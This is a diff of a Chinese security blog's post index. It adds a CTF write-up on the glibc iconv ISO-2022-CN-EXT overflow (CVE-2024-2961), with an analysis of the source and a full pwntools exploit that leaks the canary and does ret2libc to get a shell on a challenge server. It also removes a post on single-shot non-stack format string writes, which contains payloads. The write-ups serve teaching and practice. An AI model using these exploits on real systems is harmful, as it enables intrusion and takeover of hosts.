&gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS2_0;					      </span><br><span class="line">		*outptr++ = SS2_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (used &gt;= CNS11643_3_set &amp;&amp; used &lt;= CNS11643_7_set)	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS3_0;					      </span><br><span class="line">		*outptr++ = SS3_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span>							      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="comment">/* We only have to emit something if currently ASCII is	      </span></span><br><span class="line"><span class="comment">		   selected.  Otherwise we are switching within the	      </span></span><br><span class="line"><span class="comment">		   SO charset.  */</span>					      </span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">set</span> == ASCII_set)					      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    <span class="keyword">if</span> (outptr + <span class="number">1</span> &gt; outend)				      </span><br><span class="line">		      &#123;							      </span><br><span class="line">			result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">			<span class="keyword">break</span>;						      </span><br><span class="line">		      &#125;							      </span><br><span class="line">		    *outptr++ = SO;					      </span><br><span class="line">		  &#125;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="comment">/* Always test the length here since we have used up all the      </span></span><br><span class="line"><span class="comment">	       guaranteed output buffer slots.  */</span>			      </span><br><span class="line">	    <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">		<span class="keyword">break</span>;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	  &#125;								      </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">	    <span class="keyword">break</span>;							      </span><br><span class="line">	  &#125;								      </span><br><span class="line">									      </span><br><span class="line">	*outptr++ = buf[<span class="number">0</span>];						      </span><br><span class="line">	*outptr++ = buf[<span class="number">1</span>];						      </span><br><span class="line">	<span class="built_in">set</span> = used;							      </span><br><span class="line">      &#125;									      </span><br><span class="line">									      </span><br><span class="line">    <span class="comment">/* Now that we wrote the output increment the input pointer.  */</span>	      </span><br><span class="line">    inptr += <span class="number">4</span>;								      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>其中比较重要的是知道各种mask是掩码，与目标进行按位与操作时可以提取出掩码对应位的值，也就是提取出特征信息</p>
+<p><strong>used</strong>是当前正在处理的字符所属字符集的标识</p>
+<p><strong>set</strong>是当前的字符集标识</p>
+<p><strong>ann</strong>(annouce)是一个变量，用于记录已声明的字符集。</p>
+<p><strong>outptr</strong> 是指向当前输出缓冲区位置的指针。</p>
+<p><strong>outend</strong> 是指向输出缓冲区末尾（或可用空间的结束）的指针。</p>
+<p><strong>inptr</strong> 是指向当前输入缓冲区位置的指针</p>
+<h5 id="三种不同的字符集"><a href="#三种不同的字符集" class="headerlink" title="三种不同的字符集"></a>三种不同的字符集</h5><p>在字符编码转换中，SO（Shift Out）、SS2（Single Shift 2）和SS3（Single Shift 3）是用于指示不同字符集的特殊控制字符或转义序列。它们在处理多字节字符集（如ISO-2022）时尤其重要。以下是它们的区别和作用：</p>
+<h6 id="SO-Shift-Out"><a href="#SO-Shift-Out" class="headerlink" title="SO (Shift Out)"></a>SO (Shift Out)</h6><ul>
+<li><strong>用途</strong>: SO（Shift Out）是一个控制字符，用于从单字节字符集切换到多字节字符集。</li>
+<li><strong>控制字符</strong>: 通常表示为0x0E。</li>
+<li><strong>作用</strong>: 在ISO-2022编码中，SO字符表示后续的字节将使用特定的多字节字符集，直到遇到SI（Shift In）字符为止。SO和SI字符用于在ASCII和其他字符集之间切换。</li>
+</ul>
+<h6 id="SS2-Single-Shift-2"><a href="#SS2-Single-Shift-2" class="headerlink" title="SS2 (Single Shift 2)"></a>SS2 (Single Shift 2)</h6><ul>
+<li><strong>用途</strong>: SS2（Single Shift 2）是一个转义序列，用于临时从主字符集切换到第二辅助字符集，仅影响紧随其后的一个字符。</li>
+<li><strong>控制字符</strong>: 通常表示为0x8E。</li>
+<li><strong>作用</strong>: 在处理多字节字符时，SS2指示紧随其后的一个字节应被解释为第二辅助字符集中的字符。使用SS2字符可以在不改变当前字符集的情况下使用不同的字符集中的字符。</li>
+</ul>
+<h6 id="SS3-Single-Shift-3"><a href="#SS3-Single-Shift-3" class="headerlink" title="SS3 (Single Shift 3)"></a>SS3 (Single Shift 3)</h6><ul>
+<li><strong>用途</strong>: SS3（Single Shift 3）是一个转义序列，用于临时从主字符集切换到第三辅助字符集，仅影响紧随其后的一个字符。</li>
+<li><strong>控制字符</strong>: 通常表示为0x8F。</li>
+<li><strong>作用</strong>: 类似于SS2，SS3指示紧随其后的一个字节应被解释为第三辅助字符集中的字符。它允许在不改变当前字符集的情况下使用第三辅助字符集中的字符。</li>
+</ul>
+<p>具体不同字符集所属的类别可见源码中的枚举，mask掩码上方的字符集都是该类型的字符集</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    	ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="实际运行中的-used-及其对应分支"><a href="#实际运行中的-used-及其对应分支" class="headerlink" title="实际运行中的 used 及其对应分支"></a>实际运行中的 used 及其对应分支</h5><p>以UTF-8转义到ISO-2022-CN-EXT为例</p>
+<p>具体哪一个 <code>used</code> 的值被设置，取决于UTF-8输入字符在ISO-2022-CN-EXT字符集中的对应字符集。例如：</p>
+<ul>
+<li>如果输入字符是GB2312字符集中的字符，<code>used</code> 将被设置为 <code>GB2312_set</code>（值为1）。</li>
+<li>如果输入字符是CNS11643-2字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_2_set</code>（值为24）。</li>
+<li>如果输入字符是CNS11643-3字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_3_set</code>（值为96）。</li>
+</ul>
+<p>假设当前输入字符在GB2312字符集中，<code>used</code> 将被设置为 <code>GB2312_set</code>（1），并进入第一个 <code>if</code> 分支，发出对应的转义序列。类似地，对于其他字符集，<code>used</code> 将被设置为相应的值，并进入对应的 <code>if</code> 分支。</p>
+<h5 id="具体执行过程"><a href="#具体执行过程" class="headerlink" title="具体执行过程"></a>具体执行过程</h5><p><strong>1. 检查是否需要发出转义序列</strong>：首先检查当前使用的字符集（<code>set</code>）是否与目标字符集（<code>used</code>）不同。如果不同，则需要发出转义序列。</p>
+<p><strong>2. 判断是否已经声明使用该字符集</strong>：</p>
+<p>我们现在详细分析下3个if分支的条件</p>
+<p><code>if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))</code>	</p>
+<ul>
+<li><p>used &amp; SO_mask 在目标字符集类型为SO时不为0</p>
+</li>
+<li><p>(ann &amp; SO_ann) !&#x3D; (used &lt;&lt; 8)用于检测是否声明过该字符集</p>
+</li>
+<li><p>如果目标字符集是<code>SO</code>类型且未声明，则生成相应的转义序列。</p>
+</li>
+</ul>
+<p><code>else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))</code></p>
+<ul>
+<li>如果目标字符集是<code>SS2</code>类型且未声明，则生成相应的转义序列。</li>
+</ul>
+<p><code>else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))</code></p>
+<ul>
+<li>如果目标字符集是<code>SS3</code>类型且未声明，则生成相应的转义序列。</li>
+</ul>
+<p>实际我们发现只有在SO的分支里有一段边界检测的代码</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">&#123;							      </span><br><span class="line">	result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">	<span class="keyword">break</span>;						     </span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>那么我们要利用漏洞，首先就要输入一个SS2字符集或SS3字符集的字符。</p>
+<p><strong>3.生成转义序列</strong>：</p>
+<ul>
+<li>根据<code>used</code>字符集的类型，选择相应的转义序列，并写入输出缓冲区<code>outptr</code>。&lt;—关键漏洞点</li>
+<li>更新已声明的字符集<code>ann</code>。</li>
+</ul>
+<p><code>escseq</code> 是一个指向字符数组的指针，用于存储转义序列（escape sequence）。这些转义序列用于在输出数据中标识字符集的切换或特定字符的编码方式。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *escseq;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SO 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS2 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;*H&quot;</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS3 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>4.为特定字符集生成额外的字节</strong>：</p>
+<ul>
+<li>如果<code>used</code>是<code>CNS11643_2_set</code>，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC(即0x1b)与0x4e的后缀。</li>
+<li>如果<code>used</code>在<code>CNS11643_3_set</code>到<code>CNS11643_7_set</code>之间，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC与0x4f的后缀。</li>
+</ul>
+<p><strong>5.切换到ASCII字符集时发出SO字节</strong>：如果当前字符集是ASCII需要切换，且<strong>outptr + 1 &lt;&#x3D; outend</strong>，则加入0x0e后缀。</p>
+<p><strong>6.检查输出缓冲区长度</strong>：确保在写入新的字节前输出缓冲区<code>outptr</code>有足够的空间，否则返回<code>__GCONV_FULL_OUTPUT</code>错误。</p>
+<p><strong>7.改变当前字符集（若与目标字符集不同）</strong>：<code>set = used;</code></p>
+<p><strong>8.自增输入指针</strong>：处理完一个字符后，增加输入指针<code>inptr</code>。</p>
+<h4 id="四、实例分析"><a href="#四、实例分析" class="headerlink" title="四、实例分析"></a>四、实例分析</h4><h5 id="XGCTF-echo"><a href="#XGCTF-echo" class="headerlink" title="XGCTF [echo]"></a>XGCTF [echo]</h5><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185742098.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185755294.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185806653.png"
+                      class=""
+                >
+
+<p>64位程序开了canary保护，最后有个明显的往s里读0x60字节的栈溢出，那么我们就要想办法先得到canary的值。我们发现canary实际存在var_8处，而最后iconv函数实际对输入进行换编码后会存0x26字节到s中，s与canary之间只差0x28个字节，那么我们利用iconv的漏洞，先填充0x25个垃圾字符，最后写一个会触发漏洞的字符，就可以溢出3字节刚好把canary低位的\x00给覆盖了，那么printf(“%s”,s)就能直接把canary的值打印出来了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185814773.png"
+                      class=""
+                >
+
+<p>之后有了canary，又能栈溢出，直接ret2libc即可</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./echo&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28257</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x25</span> + <span class="string">&quot;劄&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\x48&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi_ret = <span class="number">0x401493</span></span><br><span class="line">ret_add = <span class="number">0x40101a</span></span><br><span class="line">main_add = <span class="number">0x401256</span></span><br><span class="line">p.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_add)) </span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_add = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_add = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;collectcrop&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(ret_add) + p64(system_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>CVE</tag>
       </tags>
   </entry>
   <entry>
@@ -1746,177 +1746,6 @@
       </tags>
   </entry>
   <entry>
-    <title>非栈上格式化字符串一次利用</title>
-    <url>/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="单次非栈上格式化字符串漏洞利用"><a href="#单次非栈上格式化字符串漏洞利用" class="headerlink" title="单次非栈上格式化字符串漏洞利用"></a>单次非栈上格式化字符串漏洞利用</h2><h4 id="问题发展路径"><a href="#问题发展路径" class="headerlink" title="问题发展路径"></a>问题发展路径</h4><ul>
-<li>一开始最基本的格式化字符串漏洞任意地址写，没有什么限制</li>
-<li>进阶一点的是非栈上的格式化字符串漏洞利用，需要利用到栈上的指向程序名称的链条以及靠近内核区域的链条，但这种方法正常而言需要多次格式化字符串漏洞的执行利用，对目标地址改动越大需要利用到越多次。</li>
-<li>最后是在读取内容非栈上的情况下，实现在一次格式化字符串漏洞的触发中直接进行对一个栈上地址的两个字节的修改，可以用于减少利用格式化字符串漏洞的次数，绕过更多的限制。</li>
-</ul>
-<h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>比如我们假设程序中有后门函数，目标是把栈上的返回地址的后两个字节给覆盖了以实现返回到后门函数中去。其中要利用到的两个链条的偏移分别为15和45。按照一般的多次漏洞的利用来说，是要先通过覆盖偏移15处的<code>0x7ffd991d220e</code>的低两个字节<code>0x220e</code>为<code>0x1898</code>，这样以后在r12指向的偏移45处就会是一个指针直接指向要返回到的地址，然后再通过写偏移45处内容的低两个字节实现对返回地址的低两个字节的写入。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001001143123.png"
-                      class=""
-                >
-
-<p>这里我们很容易就想到尝试直接把两个并到一起写，就有了如下payload：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;part1&#125;</span>c%15$hn&quot;</span> + <span class="string">f&quot;%<span class="subst">&#123;part2&#125;</span>c%45$hn&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>但在实际调试过后会发现现实的残酷，这个格式化字符串的解析中并不是按照先来后到的顺序，先解析完前一个再解析后一个的。实际上这里改的内容都是原偏移地址处指针指向的内容，最后并不会对返回地址进行修改。</p>
-<p>于是就有如下的比较神奇的绕过方法，就可以通过格式化字符串参数解析的特性来实现逐级的赋值。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;%p&quot;</span>*<span class="number">13</span></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;part1-<span class="number">130</span>-<span class="number">0x8</span>&#125;</span>c%hn&quot;</span> + <span class="string">f&quot;%<span class="subst">&#123;part2&#125;</span>c%45$hn&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>这里省略掉了<code>%x$n</code>这种组合，而是直接<code>%hn</code>，这样省略以后会根据顺序来确定指定的参数偏移，由于前面有14个%，这里的%实际就会被解析为指向偏移15处的参数，这样一来在%的解析阶段就能把指定内容写到偏移15的指针处，从而与后面的内容进行联动，实现栈上内容的低两个字节内容的修改。这里part1就是我们通过泄露出栈相关地址后，计算出的返回地址在栈上位置的后两个字节。减去130是前面13个%p打印出的内容长度，最后的减0x8是调试后测出来的差值（这个的确不知道是在哪里多的内容）。</p>
-<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>首先在<code>stdio-common/printf.c</code>中可以找到printf的具体实现。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libioP.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> printf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write formatted output to stdout from the format string FORMAT.  */</span></span><br><span class="line"><span class="comment">/* VARARGS1 */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;				<span class="comment">//声明一个 va_list 类型的变量 arg，用于存储可变参数列表。</span></span><br><span class="line">  <span class="type">int</span> done;					<span class="comment">//写入的字符数或其他状态信息。</span></span><br><span class="line"></span><br><span class="line">  va_start (arg, format);	<span class="comment">//初始化 arg，使其指向可变参数列表的第一个参数。</span></span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);				<span class="comment">//清理 arg，以释放相关资源</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_printf</span></span><br><span class="line">ldbl_strong_alias (__printf, <span class="built_in">printf</span>);</span><br><span class="line">ldbl_strong_alias (__printf, _IO_printf);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>其最核心的功能要到<code>vfprintf.c</code>中去寻找，这里结合gdb带源码调试。</p>
-<p>首先会进入ARGCHECK中进行一系列检测，确保格式字符串符合要求。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ARGCHECK(S, Format) \</span></span><br><span class="line"><span class="meta">  do									      \</span></span><br><span class="line"><span class="meta">    &#123;									      \</span></span><br><span class="line"><span class="meta">      <span class="comment">/* Check file argument for consistence.  */</span>			      \</span></span><br><span class="line"><span class="meta">      CHECK_FILE (S, -1);						 <span class="comment">//检查文件流有效性和状态     \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (S-&gt;_flags &amp; _IO_NO_WRITES)			//如果指定文件流不可写就返回错误		      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#123;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  S-&gt;_flags |= _IO_ERR_SEEN;					      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  __set_errno (EBADF);						      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  return -1;							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#125;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (Format == NULL)			//如果格式化字符串为空就返回错误			      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#123;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  __set_errno (EINVAL);						      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  return -1;							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#125;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">    &#125; while (0)</span></span></span><br></pre></td></tr></table></figure></div>
-
-<p>然后会检查文件流 <code>s</code> 是否处于无缓冲模式，如果处于无缓冲模式，代码调用一个辅助函数 <code>buffered_vfprintf</code>。这个函数的作用是为该流分配一个局部临时缓冲区，然后重新调用原来的格式化输出函数。这样可以在处理输出时提供一个缓冲层，即使原始流不支持缓冲。这里我们调试时会进到<code>buffered_vfprintf</code>里面，最后实际还会调用回<code>vfprintf</code>。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (UNBUFFERED_P (s))</span><br><span class="line"><span class="comment">/* Use a helper function which will allocate a local temporary buffer</span></span><br><span class="line"><span class="comment">   for the stream and then call us again.  */</span></span><br><span class="line">	<span class="keyword">return</span> buffered_vfprintf (s, format, ap, mode_flags);</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001102135414.png"
-                      class=""
-                >
-
-<p>然后会判断代码是否支持宽字符的处理，然后查找格式字符串中的第一个格式说明符。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specwc ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specmb ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
-
-<p>后面也有类似的，但是会自增f，用于逐个解析。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get current character in format string.  */</span></span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      f = __find_specwc ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      f = __find_specmb ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Write the following constant string.  */</span></span><br><span class="line">      outstring (end_of_spec, f - end_of_spec);</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)						\</span></span><br><span class="line"><span class="meta">  do									\</span></span><br><span class="line"><span class="meta">    &#123;									\</span></span><br><span class="line"><span class="meta">      const void *string_ = (String);					\</span></span><br><span class="line"><span class="meta">      done = outstring_func (s, string_, (Len), done);			\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (done &lt; 0)							\</span></span><br><span class="line"><span class="meta">	goto all_done;							\</span></span><br><span class="line"><span class="meta">    &#125;									\</span></span><br><span class="line"><span class="meta">   while (0)</span></span><br></pre></td></tr></table></figure></div>
-
-<p>我们现在关注那个指向程序名的链条，栈上地址低3位16进制为288。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001112058996.png"
-                      class=""
-                >
-
-<p>之后在调试时会发现，f会逐渐自增解析各个格式化字符串中的内容，在解析一串%p时其实不会在每一次outstring中打印内容，而是在解析到<code>%xxxc</code>后一并打印内容出来。之后在解析%hn时，会到这里进行跳转。这里对各种类型修饰符进行了解析</p>
